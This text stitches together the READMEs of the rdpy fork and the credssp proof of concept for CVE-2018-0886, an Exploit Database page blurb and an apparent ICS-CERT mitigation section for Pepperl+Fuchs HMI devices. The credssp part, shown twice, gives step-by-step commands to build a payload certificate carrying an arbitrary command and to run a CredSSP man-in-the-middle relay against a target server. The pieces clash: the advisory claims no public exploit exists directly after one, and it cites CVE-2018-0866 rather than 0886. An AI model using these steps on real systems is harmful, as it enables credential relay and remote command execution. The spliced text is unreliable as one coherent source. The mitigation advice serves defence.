# RDPY [Build Status](https://travis-ci.org/citronneur/rdpy) [PyPI version](http://badge.fury.io/py/rdpy)

Remote Desktop Protocol in twisted python.

RDPY is a pure Python implementation of the Microsoft RDP (Remote Desktop Protocol) protocol (client and server side). RDPY is built over the event driven network engine Twisted. RDPY support standard RDP security layer, RDP over SSL and NLA authentication (through ntlmv2 authentication protocol).

RDPY provides the following RDP and VNC binaries :

* RDP Man In The Middle proxy which is used for doing credential relay in credssp.

Relaying the credentials is useful in the context of cve-2018-0886.
Please refer to credssp library for the exploit demo.
<https://github.com/preempt/credssp>

## Build

RDPY is fully implemented in python. It is dependent upon pyQt4.

#### Linux

Example for Debian based systems :

```
sudo apt-get install python-qt4

```

Then:

```
$ git clone https://github.com/preempt/rdpy.git rdpy
$ pip install twisted pyopenssl qt4reactor service_identity rsa pyasn1 impacket
$ python rdpy/setup.py install

```

This should technically work. Although, this won't be useful for any exploitation.
Please refer to credssp library. <https://github.com/preempt/credssp>

## RDPY Binaries

RDPY comes with only one binary:

### RDPY credssp-mitm

rdpy-credsspmitm.py -k private\_key -c cert\_file [-l port] target
-l listen\_port default 3389
-k private\_key\_file\_path (generated by gen\_cmd.py)
-c certificate\_file\_path (generated by gen\_cmd.py)
target should be DNS so that kerberos will happen

```
This is the main attack script for exploiting the CVE-2018-0886 vulnerability.
It should be executed after running the gen_cmd.py script to generate a suitable private and public key. The gen_cmd.py is found in credssp.
It waits for the user to connect (to listen port) and executes the attack on the target server chosen.

It mainly composed of RDP proxy based upon rdpy implementation.

```

# credssp

This is a poc code for exploiting CVE-2018-0886. It should be used for educational purposes only.
It relies on a fork of the rdpy project(https://github.com/preempt/rdpy), allowing also credssp relay.

Written by Eyal Karni, Preempt
ekarni@preempt.com

# Build

## Instructions (Linux)
If you are using Ubuntu 14 , check the install file..
It was tested on Ubuntu 16.04.

```
$ git clone https://github.com/preempt/rdpy.git rdpy
$ git clone https://github.com/preempt/credssp.git
$ cd credssp/install
$ sh install.sh
$ cd ../../rdpy
$ sudo python setup.py install
```

EDB Mirror: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/44453.zip

* It assumes a pretty clean inital state. Best to uninstall first relevant compontants such as cryptography,pyopenssl maybe (pip uninstall cryptography).
* A different version of openssl needed to be installed for this to run successfully.  The install script does that.
* Please follow the instructions in the described order.

# Running the exploit

Export a certificate suitable for Server Authentication from any domain.

To generate a suitable certificate for the command to execute :

```
$ python credssp/bin/gen_cmd.py -c ExportedCert -o exploitc.pem -k exploitk.pem CMD
```

(exploitc.pem ,exploitk.pem are the generated certificate and private key respectively)

To run the attack script:

```
$ python /usr/local/bin/rdpy-rdpcredsspmitm.py -k exploitk.pem -c exploitc.pem TargetServer
```

More details are in the usage section of the scripts(--help).

```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# credssp

This is a poc code for exploiting CVE-2018-0886. It should be used for educational purposes only.
It relies on a fork of the rdpy project(<https://github.com/preempt/rdpy>), allowing also credssp relay.

Written by Eyal Karni, Preempt
ekarni@preempt.com

# Build

## Instructions (Linux)

If you are using Ubuntu 14 , check the install file..
It was tested on Ubuntu 16.04.

```
$ git clone https://github.com/preempt/rdpy.git rdpy
$ git clone https://github.com/preempt/credssp.git
$ cd credssp/install
$ sh install.sh
$ cd ../../rdpy
$ sudo python setup.py install

```

* It assumes a pretty clean inital state. Best to uninstall first relevant components such as cryptography, pyopenssl maybe (pip uninstall cryptography).
* A different version of openssl needed to be installed for this to run successfully. The install script does that.
* Please follow the instructions in the described order.

# Running the exploit

Export a certificate suitable for Server Authentication from any domain.
(It is used for RDP [https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn781533(v=ws.11)](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn781533%28v%3Dws.11%29))

To generate a certificate that exploits the vulnerability(contains the payload),use:

```
$ python credssp/bin/gen_cmd.py -c ExportedCert -o exploitc.pem -k exploitk.pem CMD

```

(ExportedCert is the exported certificate from step 1.
exploitc.pem ,exploitk.pem are the generated certificate and private key respectively)

To run the attack script:

```
$ python /usr/local/bin/rdpy-rdpcredsspmitm.py -k exploitk.pem -c exploitc.pem TargetServer

```

More details are in the usage section of the scripts(--help).

## 4. MITIGATIONS

PEPPRL+FUCHS recommends users using HMI devices within VisuNet RM, VisuNet PC or BTC product families follow these guidelines:

* PEPPRL+FUCHS HMI devices running RM Shell 4 should be updated with ‘RM Image 4 Security Patches 01/2017 to 05/2018’ (18-33400C):

<https://www.pepperl-fuchs.com/cgi-bin/db/doci.pl/?ShowDocByDocNo=18-33400c>

* PEPPRL+FUCHS HMI devices running RM Shell 5 should be updated with ‘RM Image 5 Security: Windows Cumulative Security Patch 07/2018’ (18-33624):

<https://www.pepperl-fuchs.com/cgi-bin/db/doci.pl/?ShowDocByDocNo=18-33624>

* PEPPRL+FUCHS HMI devices running Windows 7 or Windows 10 should be updated by using the Windows Update mechanism. See Microsoft’s security bulletin for more information:

<https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0866>

* After deploying the patch, all connected third-party clients or servers must use the latest version of the CredSSP protocol.
* Be aware of the importance of installing these patches, as security will be enforced by the update. Security by default restriction might result in an error due to encryption oracle remediation. Updates should be installed on both the server and the HMI device; otherwise, system compatibility might be influenced.

For more information CERT@VDE has released a security advisory found at:

<https://cert.vde.com/de-de/advisories/vde-2018-008>

NCCIC recommends users take defensive measures to minimize the risk of exploitation of this vulnerability. Specifically, users should:

* Minimize network exposure for all control system devices and/or systems, and ensure that they are [not accessible from the Internet](/ics/alerts/ICS-ALERT-10-301-01).
* Locate control system networks and remote devices behind firewalls, and isolate them from the business network.
* When remote access is required, use secure methods, such as Virtual Private Networks (VPNs), recognizing that VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize that VPN is only as secure as the connected devices.

NCCIC reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures.

NCCIC also provides a section for [control systems security recommended practices](/ics/content/recommended-practices) on the ICS-CERT web page. Several recommended practices are available for reading and download, including [Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies](/sites/default/files/recommended_practices/NCCIC_ICS-CERT_Defense_in_Depth_2016_S508C.pdf).

Additional mitigation guidance and recommended practices are publicly available on the [ICS-CERT website](/ics/) in the Technical Information Paper, [ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies](/ics/tips/ICS-TIP-12-146-01B).

Organizations observing any suspected malicious activity should follow their established internal procedures and report their findings to NCCIC for tracking and correlation against other incidents.

NCCIC also recommends that users take the following measures to protect themselves from social engineering attacks:

* Do not click web links or open unsolicited attachments in email messages.
* Refer to [Recognizing and Avoiding Email Scams](/reading_room/emailscams_0905.pdf) for more information on avoiding email scams.
* Refer to [Avoiding Social Engineering and Phishing Attacks](/cas/tips/ST04-014.html) for more information on social engineering attacks.

No known public exploits specifically target this vulnerability. This vulnerability is not exploitable remotely. High skill level is needed to exploit.
